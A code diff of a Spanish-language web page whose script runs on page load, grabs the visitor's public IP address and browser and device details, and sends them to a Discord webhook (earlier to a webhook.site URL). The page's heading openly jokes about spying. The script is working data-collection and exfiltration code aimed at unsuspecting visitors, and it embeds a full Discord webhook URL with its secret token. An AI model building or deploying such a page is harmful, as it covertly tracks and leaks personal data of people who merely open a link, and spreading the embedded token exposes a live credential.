@@ -18,44 +18,66 @@
   </style>
 </head>
 <body>
-  <h1>Analizando mierda...</h1>
+  <h1>Espiando al tu mama...</h1>
   <pre id="log">Recolectando datos...</pre>
 
   <script>
-    async function obtenerDatos() {
-      const log = document.getElementById('log');
+    async function enviarAWebhookDiscord(datos) {
+      const embed = {
+        title: "Nuevo visitante",
+        color: 0x00ffff,
+        fields: Object.entries(datos).map(([key, value]) => ({
+          name: key,
+          value: String(value),
+          inline: false
+        })),
+        timestamp: new Date().toISOString()
+      };
+
+      const payload = {
+        username: "Visitante Web",
+        embeds: [embed]
+      };
+
+      const response = await fetch("https://discord.com/api/webhooks/1370677537323356221/-BaECwj6b7G2rdckunAUfeWhsNOWm3q3E0cRWQUhuspzgdTBUl6ggdTJEc7dwQ8lOEdt", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(payload)
+      });
+
+      return response.ok;
+    }
+
+    async function obtenerYEnviarDatos() {
+      const log = document.getElementById("log");
+
       try {
-        const ipResp = await fetch('https://api.ipify.org?format=json');
+        const ipResp = await fetch("https://api.ipify.org?format=json");
         const ipData = await ipResp.json();
 
         const datos = {
-          ip: ipData.ip,
-          userAgent: navigator.userAgent,
-          idioma: navigator.language,
-          plataforma: navigator.platform,
-          memoria: navigator.deviceMemory || "no disponible",
-          nucleosCPU: navigator.hardwareConcurrency || "no disponible",
-          anchoPantalla: screen.width,
-          altoPantalla: screen.height,
-          fecha: new Date().toISOString()
+          IP: ipData.ip,
+          "User Agent": navigator.userAgent,
+          Idioma: navigator.language,
+          Plataforma: navigator.platform,
+          Memoria: navigator.deviceMemory || "no disponible",
+          "Núcleos CPU": navigator.hardwareConcurrency || "no disponible",
+          Resolución: `${screen.width}x${screen.height}`,
+          Fecha: new Date().toLocaleString()
         };
 
-        log.textContent = 'Enviando datos al webhook...\n\n' + JSON.stringify(datos, null, 2);
+        log.textContent = "Datos recolectados:\n\n" + JSON.stringify(datos, null, 2);
 
-        const resp = await fetch('	https://webhook.site/4dfd8076-d213-4fd0-a4ed-3d1b3be0dd80', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(datos)
-        });
-
-        const texto = await resp.text();
-        log.textContent += '\n\nRespuesta del Webhook:\n' + texto;
+        const enviado = await enviarAWebhookDiscord(datos);
+        log.textContent += "\n\nResultado del envío: " + (enviado ? "Enviado correctamente a Discord" : "Error al enviar");
       } catch (err) {
-        log.textContent += '\n\nError al enviar datos:\n' + err;
+        log.textContent += "\n\nError:\n" + err;
       }
     }
 
-    obtenerDatos();
+    obtenerYEnviarDatos();
   </script>
 </body>
 </html>
